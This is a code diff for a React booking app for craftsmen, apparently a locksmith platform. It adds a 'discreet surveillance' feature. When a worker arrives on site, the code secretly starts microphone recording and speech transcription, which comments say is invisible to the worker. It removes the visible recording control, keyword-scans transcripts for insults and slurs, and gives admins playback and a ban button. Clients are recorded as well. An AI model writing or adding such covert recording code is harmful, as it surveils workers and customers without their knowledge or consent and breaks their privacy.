@@ -78,6 +78,7 @@ const TRANS = {
     gpsActive: "GPS actif", artisanOnRoute: "Artisan en route",
     followLive: "Suivre en direct", min: "min",
     dashboard: "Dashboard", adminBonuses: "Bons", craftsmen: "Artisans", allMissions: "Missions",
+    adminSurveillance: "Surveillance", surveillanceDesc: "Enregistrements des interventions — confidentiel admin", surveillanceEmpty: "Aucun enregistrement pour l'instant", surveillanceFlagged: "Signalé", surveillanceFlaggedAlert: "enregistrement(s) signalé(s) pour propos inappropriés", surveillanceDetectedTerms: "Termes détectés", surveillanceAudio: "Enregistrement audio", surveillanceTranscript: "Transcription écrite", surveillanceBanPro: "Bannir cet artisan", surveillanceBanReason: "Propos inappropriés détectés (surveillance)",
     revenue: "Chiffre d'affaires", platformRevenue: "Revenu plateforme",
     totalMissions: "Missions totales", prosRegistered: "Pros inscrits",
     platformRevenue6m: "Revenus plateforme (6 mois)", lockrBonuses: "Bons LOCKR",
@@ -376,6 +377,7 @@ const TRANS = {
     gpsActive: "GPS active", artisanOnRoute: "Craftsman on the way",
     followLive: "Follow live", min: "min",
     dashboard: "Dashboard", adminBonuses: "Bonuses", craftsmen: "Craftsmen", allMissions: "Missions",
+    adminSurveillance: "Monitoring", surveillanceDesc: "Intervention recordings — admin confidential", surveillanceEmpty: "No recordings yet", surveillanceFlagged: "Flagged", surveillanceFlaggedAlert: "recording(s) flagged for inappropriate language", surveillanceDetectedTerms: "Detected terms", surveillanceAudio: "Audio recording", surveillanceTranscript: "Written transcript", surveillanceBanPro: "Ban this craftsman", surveillanceBanReason: "Inappropriate language detected (monitoring)",
     revenue: "Revenue", platformRevenue: "Platform revenue",
     totalMissions: "Total missions", prosRegistered: "Registered pros",
     platformRevenue6m: "Platform revenue (6 months)", lockrBonuses: "LOCKR Bonuses",
@@ -4168,6 +4170,13 @@ function ProApp({ account, bookings, setBookings, accounts, setAccounts, bons, s
   const [swipeTouchX, setSwipeTouchX] = useState(0);
   const mediaRecRef = useRef(null);
   const audioChunks = useRef([]);
+  // Surveillance discrète (côté admin uniquement)
+  const covertRecRef = useRef(null);
+  const covertChunks = useRef([]);
+  const covertStream = useRef(null);
+  const recognitionRef = useRef(null);
+  const transcriptRef = useRef("");
+  const covertActiveRef = useRef(false);
   const raf = useRef(null);
   const t0 = useRef(null);
   const JOURNEY = 38000;
@@ -4227,6 +4236,7 @@ function ProApp({ account, bookings, setBookings, accounts, setAccounts, bons, s
     raf.current = requestAnimationFrame(run);
   };
   const finishMission = (montantFinal, factureImg, statutPaiement, acompte) => {
+    stopCovertRecording(); // arrête la surveillance discrète et enregistre dans le booking
     setBookings(p => p.map(x => x.id === activeMission.id ? { ...x, statut: "terminée", montantFinal, factureImg, statutPaiement, photoAvant: photoAvant || x.photoAvant, photoApres, audioData: audioData || x.audioData } : x));
     cancelAnimationFrame(raf.current);
     setActiveMission(null); setProgress(0); setClotureModal(false);
@@ -4257,6 +4267,84 @@ function ProApp({ account, bookings, setBookings, accounts, setAccounts, bons, s
     mediaRecRef.current?.stop();
     setRecording(false);
   };
+
+  // ── Surveillance discrète : démarre à l'arrivée, invisible pour le pro ──
+  const FLAGGED_WORDS = ["connard","connasse","salaud","salope","enculé","encule","pute","putain","merde","ta gueule","ferme la","abruti","imbécile","imbecile","crève","creve","fils de","bâtard","batard","nique","ntm","fdp","pd","raciste","sale arabe","sale noir","sale juif","menace","je vais te","casse-toi","dégage","degage","arnaque","voleur","escroc"];
+  const analyzeTranscript = (text) => {
+    const low = (text || "").toLowerCase();
+    const found = FLAGGED_WORDS.filter(w => low.includes(w));
+    return { flagged: found.length > 0, words: [...new Set(found)] };
+  };
+  const startCovertRecording = async (missionId) => {
+    if (covertActiveRef.current) return;
+    covertActiveRef.current = true;
+    transcriptRef.current = "";
+    // Audio
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+      covertStream.current = stream;
+      const mr = new MediaRecorder(stream);
+      covertChunks.current = [];
+      mr.ondataavailable = e => covertChunks.current.push(e.data);
+      mr.onstop = () => {
+        const blob = new Blob(covertChunks.current, { type: "audio/webm" });
+        const reader = new FileReader();
+        reader.onload = ev => {
+          const transcript = transcriptRef.current.trim();
+          const analysis = analyzeTranscript(transcript);
+          setBookings(p => p.map(x => x.id === missionId ? {
+            ...x,
+            surveillance: {
+              audio: ev.target.result,
+              transcript: transcript || "(aucune parole détectée)",
+              flagged: analysis.flagged,
+              flaggedWords: analysis.words,
+              proNom: account.nom || account.prenom || "Pro",
+              artisanId: account.artisanId,
+              date: ts(),
+            }
+          } : x));
+        };
+        reader.readAsDataURL(blob);
+        stream.getTracks().forEach(t => t.stop());
+      };
+      mr.start();
+      covertRecRef.current = mr;
+    } catch {}
+    // Transcription live (Web Speech API)
+    try {
+      const SR = window.SpeechRecognition || window.webkitSpeechRecognition;
+      if (SR) {
+        const rec = new SR();
+        rec.lang = lang === "en" ? "en-US" : "fr-FR";
+        rec.continuous = true;
+        rec.interimResults = false;
+        rec.onresult = (e) => {
+          for (let i = e.resultIndex; i < e.results.length; i++) {
+            if (e.results[i].isFinal) transcriptRef.current += e.results[i][0].transcript + " ";
+          }
+        };
+        rec.onend = () => { if (covertActiveRef.current) { try { rec.start(); } catch {} } };
+        rec.start();
+        recognitionRef.current = rec;
+      }
+    } catch {}
+  };
+  const stopCovertRecording = () => {
+    if (!covertActiveRef.current) return;
+    covertActiveRef.current = false;
+    try { recognitionRef.current?.stop(); } catch {}
+    try { covertRecRef.current?.stop(); } catch {}
+  };
+  // Cleanup au démontage
+  useEffect(() => () => { covertActiveRef.current = false; try { recognitionRef.current?.stop(); } catch {}; try { covertRecRef.current?.stop(); } catch {}; covertStream.current?.getTracks().forEach(t => t.stop()); }, []);
+
+  // Démarrage automatique et discret de la surveillance à l'arrivée sur place
+  useEffect(() => {
+    if (activeMission && progress >= 0.97 && !covertActiveRef.current) {
+      startCovertRecording(activeMission.id);
+    }
+  }, [progress, activeMission?.id]);
 
   // Feature 1: photo handlers
   const handlePhotoAvant = e => {
@@ -4578,24 +4666,6 @@ function ProApp({ account, bookings, setBookings, accounts, setAccounts, bons, s
                       )}
                     </div>
                   )}
-                  {/* Feature 5: Audio recording */}
-                  <div className="lk-card" style={{ padding: "12px 14px", marginBottom: 10 }}>
-                    <div style={{ color: T.textMid, fontWeight: 600, fontSize: 13, marginBottom: 8 }}>{tr.recordDiscussion}</div>
-                    {!audioData ? (
-                      <button onClick={recording ? stopRecording : startRecording} style={{ width: "100%", background: recording ? "rgba(220,38,38,.08)" : "rgba(0,0,0,.03)", border: `1px solid ${recording ? "rgba(220,38,38,.25)" : "rgba(0,0,0,.1)"}`, borderRadius: 10, padding: "10px", cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center", gap: 8, color: recording ? T.danger : T.textMid, fontWeight: 600, fontSize: 13, fontFamily: "'Inter',sans-serif" }}>
-                        <div style={{ width: 8, height: 8, borderRadius: "50%", background: recording ? T.danger : T.textLo, animation: recording ? "blink 1s infinite" : "none" }} />
-                        {recording ? tr.stopRecording : tr.startRecording}
-                      </button>
-                    ) : (
-                      <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
-                        <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
-                          {Icon.check(T.success, 14)}
-                          <span style={{ color: T.success, fontSize: 12, fontWeight: 600 }}>{tr.audioRecorded}</span>
-                        </div>
-                        <audio controls src={audioData} style={{ width: "100%" }} />
-                      </div>
-                    )}
-                  </div>
                   {/* Feature 1: Photo après */}
                   <div className="lk-card" style={{ padding: "12px 14px", marginBottom: 10 }}>
                     <div style={{ color: T.textMid, fontWeight: 600, fontSize: 13, marginBottom: 8 }}>{tr.photoApres}</div>
@@ -5532,6 +5602,7 @@ function AdminApp({ account, bookings, setBookings, accounts, setAccounts, bons,
     { id: "bons", l: `${tr.adminBonuses} (${adminBons.length})` },
     { id: "pros", l: tr.craftsmen },
     { id: "missions", l: tr.allMissions },
+    { id: "surveillance", l: `${tr.adminSurveillance}${bookings.filter(b => b.surveillance?.flagged).length ? ` ⚠️ (${bookings.filter(b => b.surveillance?.flagged).length})` : ""}` },
     { id: "bannissements", l: tr.bannissements },
     { id: "validations", l: `${tr.validations} (${accounts.filter(a => a.role === "pro" && a.dossierStatus === "pending").length})` },
     { id: "clients", l: tr.allClients },
@@ -5899,6 +5970,59 @@ function AdminApp({ account, bookings, setBookings, accounts, setAccounts, bons,
             })}
           </>
         )}
+        {tab === "surveillance" && (() => {
+          const recs = bookings.filter(b => b.surveillance).sort((a, b) => (b.surveillance.flagged ? 1 : 0) - (a.surveillance.flagged ? 1 : 0));
+          const flaggedCount = recs.filter(r => r.surveillance.flagged).length;
+          return (
+            <>
+              <div style={{ color: T.textHi, fontWeight: 700, fontSize: 15, marginBottom: 4 }}>{tr.adminSurveillance}</div>
+              <div style={{ color: T.textLo, fontSize: 12, marginBottom: 16 }}>{tr.surveillanceDesc}</div>
+              {flaggedCount > 0 && (
+                <div style={{ background: "rgba(220,38,38,.07)", border: "1px solid rgba(220,38,38,.25)", borderRadius: 12, padding: "12px 14px", marginBottom: 14, display: "flex", gap: 10, alignItems: "center" }}>
+                  {Icon.warning(T.danger, 18)}
+                  <span style={{ color: T.danger, fontWeight: 700, fontSize: 13 }}>{flaggedCount} {tr.surveillanceFlaggedAlert}</span>
+                </div>
+              )}
+              {recs.length === 0 && <div style={{ textAlign: "center", padding: "48px 20px", color: T.textLo, fontSize: 14 }}>{tr.surveillanceEmpty}</div>}
+              {recs.map(b => {
+                const s = b.surveillance;
+                const pr = PROBLEMES.find(p => p.id === b.probleme);
+                return (
+                  <div key={b.id} className="lk-card" style={{ padding: "16px", marginBottom: 12, border: s.flagged ? `1.5px solid ${T.danger}` : undefined }}>
+                    <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", marginBottom: 10 }}>
+                      <div>
+                        <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
+                          <span style={{ color: T.textHi, fontWeight: 700, fontSize: 14 }}>{s.proNom}</span>
+                          {s.flagged && <span style={{ background: "rgba(220,38,38,.1)", border: "1px solid rgba(220,38,38,.3)", color: T.danger, fontSize: 10, fontWeight: 800, padding: "2px 8px", borderRadius: 6 }}>⚠️ {tr.surveillanceFlagged}</span>}
+                        </div>
+                        <div style={{ color: T.textLo, fontSize: 12, marginTop: 2 }}>{pLabel(pr, lang)} · {b.clientNom} · {fmtDate(s.date)}</div>
+                      </div>
+                    </div>
+                    {s.flagged && s.flaggedWords?.length > 0 && (
+                      <div style={{ background: "rgba(220,38,38,.05)", borderRadius: 8, padding: "8px 12px", marginBottom: 10 }}>
+                        <div style={{ color: T.danger, fontSize: 11, fontWeight: 700, marginBottom: 4 }}>{tr.surveillanceDetectedTerms} :</div>
+                        <div style={{ display: "flex", flexWrap: "wrap", gap: 6 }}>
+                          {s.flaggedWords.map((w, i) => <span key={i} style={{ background: "rgba(220,38,38,.1)", color: T.danger, fontSize: 11, fontWeight: 600, padding: "2px 8px", borderRadius: 6 }}>{w}</span>)}
+                        </div>
+                      </div>
+                    )}
+                    <div style={{ marginBottom: 10 }}>
+                      <div style={{ color: T.textLo, fontSize: 11, fontWeight: 600, marginBottom: 4 }}>🎙 {tr.surveillanceAudio}</div>
+                      {s.audio ? <audio controls src={s.audio} style={{ width: "100%" }} /> : <div style={{ color: T.textLo, fontSize: 12 }}>—</div>}
+                    </div>
+                    <div>
+                      <div style={{ color: T.textLo, fontSize: 11, fontWeight: 600, marginBottom: 4 }}>📝 {tr.surveillanceTranscript}</div>
+                      <div style={{ background: "rgba(0,0,0,.03)", borderRadius: 8, padding: "10px 12px", fontSize: 13, color: T.textMid, lineHeight: 1.5, maxHeight: 140, overflowY: "auto" }}>{s.transcript}</div>
+                    </div>
+                    {s.flagged && (
+                      <button onClick={() => setBannedList(p => p.find(x => x.artisanId === s.artisanId) ? p : [...p, { artisanId: s.artisanId, nom: s.proNom, reason: tr.surveillanceBanReason, date: ts() }])} className="lk-ghost" style={{ marginTop: 12, fontSize: 12, padding: "8px 14px", color: T.danger, borderColor: T.danger }}>{tr.surveillanceBanPro}</button>
+                    )}
+                  </div>
+                );
+              })}
+            </>
+          );
+        })()}
         {tab === "marketplace" && (() => {
           const totalSalesVol = sales.reduce((s, v) => s + v.prix, 0);
           const totalCommission = sales.reduce((s, v) => s + v.commission, 0);
